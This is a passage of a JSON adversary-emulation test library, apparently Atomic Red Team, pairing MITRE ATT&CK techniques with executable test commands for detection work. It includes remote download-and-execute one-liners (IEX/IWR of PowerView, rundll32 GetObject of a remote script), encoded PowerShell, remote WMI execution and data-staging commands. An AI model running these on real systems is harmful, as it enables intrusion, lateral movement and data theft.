"supported_platforms": ["linux", "macos"], "input_arguments": {"input_folder": {"description": "Path to the folder used to store the test files", "type": "path", "default": "/tmp/t1560"}, "input_file": {"description": "Name of the compressed and encrypted files", "type": "string", "default": "t1560_data"}, "enc_pass": {"description": "Password used to encrypt the data", "type": "string", "default": "atomic_enc_pass"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "The folder and test files must exist", "prereq_command": "if [ ! -d #{input_folder} ]; then exit 1; else exit 0; fi;", "get_prereq_command": "if [ ! -d #{input_folder} ]; then mkdir -p #{input_folder}; cd #{input_folder}; touch {a..z}.data; fi;"}], "executor": {"command": "zip -r  #{input_folder}/#{input_file}.zip #{input_folder}\nopenssl enc -aes-256-cbc -pass pass:#{enc_pass} -p -in #{input_folder}/#{input_file}.zip -out #{input_folder}/#{input_file}.enc \ncat #{input_folder}/#{input_file}.enc | base64", "cleanup_command": "rm -rf #{input_folder}", "name": "bash", "elevation_required": false}}]}, "T1021.005": {"name": "VNC", "technique_id": "attack-pattern--01327cde-66c4-4123-bf34-5f258d59457b", "external_id": "T1021.005", "data_components": ["Logon Session Creation", "Network Connection Creation", "Process Creation"], "kill_chain_phases": ["lateral-movement"], "data_source_platforms": [], "mitigations": ["course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d", "course-of-action--23843cff-f7b9-4659-a7b7-713ef347f547", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (\u201cremote framebuffer\u201d) protocol to enable users to remotely control another computer\u2019s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol)\n\nVNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation: VNC Authentication)\n\nAdversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)", "atomic_tests": [{"name": "Enable Apple Remote Desktop Agent", "auto_generated_guid": "8a930abe-841c-4d4f-a877-72e9fe90b9ea", "description": "ARD leverages a blend of protocols, including VNC to send the screen and control buffers and SSH for secure file transfer. \nAdversaries can abuse ARD to gain remote code execution and perform lateral movement.\n\nReferences:  https://www.mandiant.com/resources/blog/leveraging-apple-remote-desktop-for-good-and-evil\n", "supported_platforms": ["macos"], "executor": {"name": "sh", "command": "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -allowAccessFor -allUsers -privs -all -quiet\n", "cleanup_command": "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -deactivate -stop -configure -privs -none -quiet\n", "elevation_required": true}}]}, "T1047": {"name": "Windows Management Instrumentation", "technique_id": "attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055", "external_id": "T1047", "data_components": ["Process Creation", "Command Execution", "Network Connection Creation"], "kill_chain_phases": ["execution"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f"], "description": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) (WinRM).(Citation: MSDN WMI) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: MSDN WMI)(Citation: FireEye WMI 2015)\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015)", "atomic_tests": [{"name": "WMI Reconnaissance Users", "auto_generated_guid": "c107778c-dcf5-47c5-af2e-1d058a3df3ea", "description": "An adversary might use WMI to list all local User Accounts. \nWhen the test completes , there should be local user accounts information displayed on the command line.\n", "supported_platforms": ["windows"], "executor": {"command": "wmic useraccount get /ALL /format:csv\n", "name": "command_prompt"}}, {"name": "WMI Reconnaissance Processes", "auto_generated_guid": "5750aa16-0e59-4410-8b9a-8a47ca2788e2", "description": "An adversary might use WMI to list Processes running on the compromised host.\nWhen the test completes , there should be running processes listed on the command line.\n", "supported_platforms": ["windows"], "executor": {"command": "wmic process get caption,executablepath,commandline /format:csv\n", "name": "command_prompt"}}, {"name": "WMI Reconnaissance Software", "auto_generated_guid": "718aebaa-d0e0-471a-8241-c5afa69c7414", "description": "An adversary might use WMI to list installed Software hotfix and patches.\nWhen the test completes, there should be a list of installed patches and when they were installed.\n", "supported_platforms": ["windows"], "executor": {"command": "wmic qfe get description,installedOn /format:csv\n", "name": "command_prompt"}}, {"name": "WMI Reconnaissance List Remote Services", "auto_generated_guid": "0fd48ef7-d890-4e93-a533-f7dedd5191d3", "description": "An adversary might use WMI to check if a certain Remote Service is running on a remote device. \nWhen the test completes, a service information will be displayed on the screen if it exists.\nA common feedback message is that \"No instance(s) Available\" if the service queried is not running.\nA common error message is \"Node - (provided IP or default)  ERROR Description =The RPC server is unavailable\" \nif the provided remote host is unreachable\n", "supported_platforms": ["windows"], "input_arguments": {"node": {"description": "Ip Address", "type": "string", "default": "127.0.0.1"}, "service_search_string": {"description": "Name Of Service", "type": "string", "default": "Spooler"}}, "executor": {"command": "wmic /node:\"#{node}\" service where (caption like \"%#{service_search_string}%\")\n", "name": "command_prompt"}}, {"name": "WMI Execute Local Process", "auto_generated_guid": "b3bdfc91-b33e-4c6d-a5c8-d64bee0276b3", "description": "This test uses wmic.exe to execute a process on the local host.\nWhen the test completes , a new process will be started locally .A notepad application will be started when input is left on default.\n", "supported_platforms": ["windows"], "input_arguments": {"process_to_execute": {"description": "Name or path of process to execute.", "type": "string", "default": "notepad.exe"}}, "executor": {"command": "wmic process call create #{process_to_execute}\n", "cleanup_command": "wmic process where name='#{process_to_execute}' delete >nul 2>&1\n", "name": "command_prompt"}}, {"name": "WMI Execute Remote Process", "auto_generated_guid": "9c8ef159-c666-472f-9874-90c8d60d136b", "description": "This test uses wmic.exe to execute a process on a remote host. Specify a valid value for remote IP using the node parameter.\nTo clean up, provide the same node input as the one provided to run the test\nA common error message is \"Node - (provided IP or default)  ERROR Description =The RPC server is unavailable\" if the default or provided IP is unreachable\n", "supported_platforms": ["windows"], "input_arguments": {"node": {"description": "Ip Address", "type": "string", "default": "127.0.0.1"}, "user_name": {"description": "Username", "type": "string", "default": "DOMAIN\\Administrator"}, "password": {"description": "Password", "type": "string", "default": "P@ssw0rd1"}, "process_to_execute": {"description": "Name or path of process to execute.", "type": "string", "default": "notepad.exe"}}, "executor": {"command": "wmic /user:#{user_name} /password:#{password} /node:\"#{node}\" process call create #{process_to_execute}\n", "cleanup_command": "wmic /user:#{user_name} /password:#{password} /node:\"#{node}\" process where name='#{process_to_execute}' delete >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Create a Process using WMI Query and an Encoded Command", "auto_generated_guid": "7db7a7f9-9531-4840-9b30-46220135441c", "description": "Solarigate persistence is achieved via backdoors deployed via various techniques including using PowerShell with an EncodedCommand\n Powershell -nop -exec bypass -EncodedCommand <encoded command>\nWhere the \u2013EncodedCommand, once decoded, would resemble:\n  Invoke-WMIMethod win32_process -name create -argumentlist \u2018rundll32 c:\\windows\\idmu\\common\\ypprop.dll _XInitImageFuncPtrs\u2019 -ComputerName WORKSTATION\nThe EncodedCommand in this atomic is the following: Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe\nYou should expect to see notepad.exe running after execution of this test.\n[Solarigate Analysis from Microsoft](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/)\n", "supported_platforms": ["windows"], "executor": {"command": "powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA\n", "name": "command_prompt"}}, {"name": "Create a Process using obfuscated Win32_Process", "auto_generated_guid": "10447c83-fc38-462a-a936-5102363b1c43", "description": "This test tries to mask process creation by creating a new class that inherits from Win32_Process. Indirect call of suspicious method such as Win32_Process::Create can break detection logic.\n[Cybereason blog post No Win32_ProcessNeeded](https://www.cybereason.com/blog/wmi-lateral-movement-win32)\n", "supported_platforms": ["windows"], "input_arguments": {"new_class": {"description": "Derived class name", "type": "string", "default": "Win32_Atomic"}, "process_to_execute": {"description": "Name or path of process to execute.", "type": "string", "default": "notepad.exe"}}, "executor": {"name": "powershell", "elevation_required": true, "command": "$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\"Win32_Process\"))\n$NewClass = $Class.Derive(\"#{new_class}\")\n$NewClass.Put()\nInvoke-WmiMethod -Path #{new_class} -Name create -ArgumentList #{process_to_execute}\n", "cleanup_command": "$CleanupClass = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\"#{new_class}\"))\ntry { $CleanupClass.Delete() } catch {}\n"}}, {"name": "WMI Execute rundll32", "auto_generated_guid": "00738d2a-4651-4d76-adf2-c43a41dfb243", "description": "This test uses wmic.exe to execute a DLL function using rundll32. Specify a valid value for remote IP using the node parameter.\n", "supported_platforms": ["windows"], "input_arguments": {"node": {"description": "Ip Address", "type": "string", "default": "127.0.0.1"}, "dll_to_execute": {"description": "Path to DLL.", "type": "string", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\calc.dll"}, "function_to_execute": {"description": "Name of DLL function to call", "type": "string", "default": "StartW"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "DLL with function to execute must exist on disk at specified location (#{dll_to_execute})", "prereq_command": "if (Test-Path \"#{dll_to_execute}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/bin/calc.dll?raw=true\" -OutFile \"#{dll_to_execute}\"\n"}], "executor": {"command": "wmic /node:#{node} process call create \"rundll32.exe \\\"#{dll_to_execute}\\\" #{function_to_execute}\"\n", "cleanup_command": "taskkill /f /im calculator.exe", "name": "command_prompt"}}, {"name": "Application uninstall using WMIC", "auto_generated_guid": "c510d25b-1667-467d-8331-a56d3e9bc4ff", "description": "Emulates uninstalling  applications using WMIC.  This method only works if the product was installed with an msi file.  APTs have been seen using this to uninstall security products.", "supported_platforms": ["windows"], "input_arguments": {"node": {"description": "Computer the action is being executed against but defaults to the localhost.", "type": "string", "default": "127.0.0.1"}, "product": {"description": "Enter the product name being uninstalled.  This will default to TightVNC.", "type": "string", "default": "Tightvnc"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "TightVNC must be installed.", "prereq_command": "if ((Test-Path \"C:\\Program Files\\TightVNC\\tvnviewer.exe\")-Or (Test-Path \"C:\\Program Files (x86)\\TightVNC\\tvnviewer.exe\")) {exit 0} else {exit 1}", "get_prereq_command": "Invoke-WebRequest 'https://www.tightvnc.com/download/2.8.63/tightvnc-2.8.63-gpl-setup-64bit.msi' -OutFile \"PathToAtomicsFolder..\\ExternalPayloads\\tightvncinstaller.msi\"\nstart-sleep -s 10\nmsiexec /i \"PathToAtomicsFolder..\\ExternalPayloads\\tightvncinstaller.msi\" /qn /norestart\nstart-sleep -s 15"}], "executor": {"command": "wmic /node:\"#{node}\" product where \"name like '#{product}%%'\" call uninstall", "cleanup_command": "msiexec /i \"PathToAtomicsFolder..\\ExternalPayloads\\tightvncinstaller.msi\" /qn /norestart", "name": "command_prompt", "elevation_required": true}}]}, "T1113": {"name": "Screen Capture", "technique_id": "attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688", "external_id": "T1113", "data_components": ["Command Execution", "OS API Execution"], "kill_chain_phases": ["collection"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)\n", "atomic_tests": [{"name": "Screencapture", "auto_generated_guid": "0f47ceb1-720f-4275-96b8-21f0562217ac", "description": "Use screencapture command to collect a full desktop screenshot\n", "supported_platforms": ["macos"], "input_arguments": {"output_file": {"description": "Output file path", "type": "path", "default": "/tmp/T1113_desktop.png"}}, "executor": {"command": "screencapture #{output_file}\n", "cleanup_command": "rm #{output_file}\n", "name": "bash"}}, {"name": "Screencapture (silent)", "auto_generated_guid": "deb7d358-5fbd-4dc4-aecc-ee0054d2d9a4", "description": "Use screencapture command to collect a full desktop screenshot\n", "supported_platforms": ["macos"], "input_arguments": {"output_file": {"description": "Output file path", "type": "path", "default": "/tmp/T1113_desktop.png"}}, "executor": {"command": "screencapture -x #{output_file}\n", "cleanup_command": "rm #{output_file}\n", "name": "bash"}}, {"name": "X Windows Capture", "auto_generated_guid": "8206dd0c-faf6-4d74-ba13-7fbe13dce6ac", "description": "Use xwd command to collect a full desktop screenshot and review file with xwud\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Output file path", "type": "path", "default": "/tmp/T1113_desktop.xwd"}, "package_checker": {"description": "Package checking command for linux. Debian system command- dpkg -s x11-apps", "type": "string", "default": "rpm -q xorg-x11-apps"}, "package_installer": {"description": "Package installer command for linux. Debian system command- apt-get install x11-apps", "type": "string", "default": "yum install -y xorg-x11-apps"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "Package with XWD and XWUD must exist on device\n", "prereq_command": "if #{package_checker} > /dev/null; then exit 0; else exit 1; fi\n", "get_prereq_command": "sudo #{package_installer} \n"}], "executor": {"command": "xwd -root -out #{output_file}\nxwud -in #{output_file}\n", "cleanup_command": "rm #{output_file}\n", "name": "bash"}}, {"name": "X Windows Capture (freebsd)", "auto_generated_guid": "562f3bc2-74e8-46c5-95c7-0e01f9ccc65c", "description": "Use xwd command to collect a full desktop screenshot and review file with xwud\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Output file path", "type": "path", "default": "/tmp/T1113_desktop.xwd"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Package with XWD and XWUD must exist on device\n", "prereq_command": "if [ -x \"$(command -v xwd)\" ]; then exit 0; else exit 1; fi\nif [ -x \"$(command -v xwud)\" ]; then exit 0; else exit 1; fi\n", "get_prereq_command": "pkg install -y xwd xwud \n"}], "executor": {"command": "xwd -root -out #{output_file}\nxwud -in #{output_file}\n", "cleanup_command": "rm #{output_file}\n", "name": "sh"}}, {"name": "Capture Linux Desktop using Import Tool", "auto_generated_guid": "9cd1cccb-91e4-4550-9139-e20a586fcea1", "description": "Use import command from ImageMagick to collect a full desktop screenshot\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Output file path", "type": "path", "default": "/tmp/T1113_desktop.png"}}, "dependencies": [{"description": "ImageMagick must be installed\n", "prereq_command": "if import -help > /dev/null 2>&1; then exit 0; else exit 1; fi\n", "get_prereq_command": "sudo apt install graphicsmagick-imagemagick-compat\n"}], "executor": {"command": "import -window root #{output_file}\n", "cleanup_command": "rm #{output_file}\n", "name": "bash"}}, {"name": "Capture Linux Desktop using Import Tool (freebsd)", "auto_generated_guid": "18397d87-38aa-4443-a098-8a48a8ca5d8d", "description": "Use import command from ImageMagick to collect a full desktop screenshot\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Output file path", "type": "path", "default": "/tmp/T1113_desktop.png"}}, "dependencies": [{"description": "ImageMagick must be installed\n", "prereq_command": "if import -help > /dev/null 2>&1; then exit 0; else exit 1; fi\n", "get_prereq_command": "pkg install -y ImageMagick7\n"}], "executor": {"command": "import -window root #{output_file}\n", "cleanup_command": "rm #{output_file}\n", "name": "sh"}}, {"name": "Windows Screencapture", "auto_generated_guid": "3c898f62-626c-47d5-aad2-6de873d69153", "description": "Use Psr.exe binary to collect screenshots of user display. Test will do left mouse click to simulate user behaviour\n", "supported_platforms": ["windows"], "input_arguments": {"output_file": {"description": "Output file path", "type": "path", "default": "c:\\temp\\T1113_desktop.zip"}, "recording_time": {"description": "Time to take screenshots", "type": "integer", "default": 5}}, "executor": {"name": "powershell", "elevation_required": false, "command": "cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12\nAdd-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;\n[W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);\ncmd /c \"timeout #{recording_time} > NULL && psr.exe /stop\"\n", "cleanup_command": "rm #{output_file} -ErrorAction Ignore\n"}}, {"name": "Windows Screen Capture (CopyFromScreen)", "auto_generated_guid": "e9313014-985a-48ef-80d9-cde604ffc187", "description": "Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.\n\n[Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen\n", "supported_platforms": ["windows"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed", "type": "path", "default": "$env:TEMP\\T1113.png"}}, "executor": {"command": "Add-Type -AssemblyName System.Windows.Forms\n$screen = [Windows.Forms.SystemInformation]::VirtualScreen\n$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height\n$graphic = [Drawing.Graphics]::FromImage($bitmap)\n$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)\n$bitmap.Save(\"#{output_file}\")\n", "cleanup_command": "Remove-Item #{output_file} -ErrorAction Ignore\n", "name": "powershell"}}]}, "T1033": {"name": "System Owner/User Discovery", "technique_id": "attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104", "external_id": "T1033", "data_components": ["OS API Execution", "Process Access", "Windows Registry Key Access", "Active Directory Object Access", "Network Traffic Content", "File Access", "Process Creation", "Command Execution", "Network Traffic Flow"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show users` and `show ssh` can be used to display users currently logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)", "atomic_tests": [{"name": "System Owner/User Discovery", "auto_generated_guid": "4c4959bf-addf-4b4a-be86-8d09cc1857aa", "description": "Identify System owner or users on an endpoint.\n\nUpon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. \nAdditionally, two files will be written to disk - computers.txt and usernames.txt.\n", "supported_platforms": ["windows"], "input_arguments": {"computer_name": {"description": "Name of remote computer", "type": "string", "default": "localhost"}}, "executor": {"command": "cmd.exe /C whoami\nwmic useraccount get /ALL\nquser /SERVER:\"#{computer_name}\"\nquser\nqwinsta.exe /server:#{computer_name}\nqwinsta.exe\nfor /F \"tokens=1,2\" %i in ('qwinsta /server:#{computer_name} ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt\n@FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\n", "name": "command_prompt"}}, {"name": "System Owner/User Discovery", "auto_generated_guid": "2a9b677d-a230-44f4-ad86-782df1ef108c", "description": "Identify System owner or users on an endpoint\n\nUpon successful execution, sh will stdout list of usernames.\n", "supported_platforms": ["linux", "macos"], "executor": {"command": "users\nw\nwho\n", "name": "sh"}}, {"name": "Find computers where user has session - Stealth mode (PowerView)", "auto_generated_guid": "29857f27-a36f-4f7e-8084-4557cd6207ca", "description": "Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.", "supported_platforms": ["windows"], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose\n", "name": "powershell"}}, {"name": "User Discovery With Env Vars PowerShell Script", "auto_generated_guid": "dcb6cdee-1fb0-4087-8bf8-88cfd136ba51", "description": "Use the PowerShell environment variables to identify the current logged user.", "supported_platforms": ["windows"], "executor": {"command": "[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt \n$env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append\n", "cleanup_command": "Remove-Item -Path .\\CurrentactiveUser.txt -Force\n", "name": "powershell"}}, {"name": "GetCurrent User with PowerShell Script", "auto_generated_guid": "1392bd0f-5d5a-429e-81d9-eb9d4d4d5b3b", "description": "Use the PowerShell \"GetCurrent\" method of the WindowsIdentity .NET class to identify the logged user.", "supported_platforms": ["windows"], "executor": {"command": "[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt\n", "cleanup_command": "Remove-Item -Path .\\CurrentUserObject.txt -Force\n", "name": "powershell"}}, {"name": "System Discovery - SocGholish whoami", "auto_generated_guid": "3d257a03-eb80-41c5-b744-bb37ac7f65c7", "description": "SocGholish performs whoami discovery commands and outputs the results to a tmp file. \nThe test will generate a filename similar to the random one generated during execution and write the file to AppData\\Temp.\n\nReference: https://redcanary.com/threat-detection-report/threats/socgholish/\n", "supported_platforms": ["windows"], "input_arguments": {"output_path": {"description": "Location of output file", "type": "string", "default": "$env:temp"}}, "executor": {"command": "$TokenSet = @{\n  U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\n  N = [Char[]]'0123456789'\n}\n$Upper = Get-Random -Count 5 -InputObject $TokenSet.U\n$Number = Get-Random -Count 5 -InputObject $TokenSet.N\n$StringSet = $Upper + $Number\n$rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''\n$file = \"rad\" + $rad + \".tmp\"\n\nwhoami.exe /all >> #{output_path}\\$file\n", "cleanup_command": "Remove-Item -Path #{output_path}\\rad*.tmp -Force\n", "name": "powershell"}}]}, "T1218.011": {"name": "Rundll32", "technique_id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5", "external_id": "T1218.011", "data_components": ["File Metadata", "Module Load", "Command Execution", "Process Creation"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--d2a24649-9694-4c97-9c62-ce7b270bf6a3"], "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ", "atomic_tests": [{"name": "Rundll32 execute JavaScript Remote Payload With GetObject", "auto_generated_guid": "57ba4ce9-ee7a-4f27-9928-3c70c489b59d", "description": "Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened. \nThis has been used by Win32/Poweliks malware and works as described [here](https://www.stormshield.com/news/poweliks-command-line-confusion/)\n\nNote: The GetObject function is no longer supported in Internet Explorer v9 (2011) and later so this technique would only work where very old versions of IE are installed. \n", "supported_platforms": ["windows"], "input_arguments": {"file_url": {"description": "location of the payload", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct"}}, "executor": {"command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:#{file_url}\").Exec();window.close();\n", "cleanup_command": "taskkill /IM notepad.exe /f\n", "name": "command_prompt"}}, {"name": "Rundll32 execute VBscript command", "auto_generated_guid": "638730e7-7aed-43dc-bf8c-8117f805f5bb", "description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched\n", "supported_platforms": ["windows"], "input_arguments": {"command_to_execute": {"description": "Command for rundll32.exe to execute", "type": "string", "default": "calc.exe"}}, "executor": {"command": "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"#{command_to_execute}\"),0)\n", "name": "command_prompt"}}, {"name": "Rundll32 execute VBscript command using Ordinal number", "auto_generated_guid": "32d1cf1b-cbc2-4c09-8d05-07ec5c83a821", "description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched\n", "supported_platforms": ["windows"], "input_arguments": {"command_to_execute": {"description": "Command for rundll32.exe to execute", "type": "string", "default": "calc.exe"}}, "executor": {"command": "rundll32 vbscript:\"\\..\\mshtml,#135 \"+String(CreateObject(\"WScript.Shell\").Run(\"#{command_to_execute}\"),0)\n", "name": "command_prompt"}}, {"name": "Rundll32 advpack.dll Execution", "auto_generated_guid": "d91cae26-7fc1-457b-a854-34c8aad48c89", "description": "Test execution of a command using rundll32.exe with advpack.dll.\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml\nUpon execution calc.exe will be launched\n", "supported_platforms": ["windows"], "input_arguments": {"inf_to_execute": {"description": "Local location of inf file", "type": "string", "default": "PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Inf file must exist on disk at specified location (\"#{inf_to_execute}\")\n", "prereq_command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{inf_to_execute}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf\" -OutFile \"#{inf_to_execute}\"\n"}], "executor": {"command": "rundll32.exe advpack.dll,LaunchINFSection 